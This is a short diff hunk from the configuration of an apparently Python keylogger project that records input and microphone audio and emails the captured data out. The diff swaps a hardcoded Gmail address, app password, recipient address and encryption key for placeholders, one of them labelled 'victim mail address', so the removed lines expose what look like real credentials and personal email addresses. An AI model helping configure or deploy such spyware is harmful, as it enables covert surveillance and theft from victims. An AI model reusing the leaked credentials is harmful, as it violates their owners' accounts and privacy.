@@ -40,14 +40,14 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "sukuna2217@gmail.com"
-password = "tjqtiwrbvygiiedf"
+email_address = " #mail id to send the email"
+password =  #password
 
-toaddr = "suryakoduru23@gmail.com"
+toaddr = "victim mail address"
 
-key = "kXQnzwGo19sYjVAqyLqmoS40jerUWAzGMLqU6NthMEQ="
+key = "#key that is generated in Encrypt.py"
 
-file_path = "E:\\Project\\Keylogger"
+file_path = "E:\\Project\\Keylogger" #file path of program
 extend = "\\"
 file_merge = file_path + extend
 
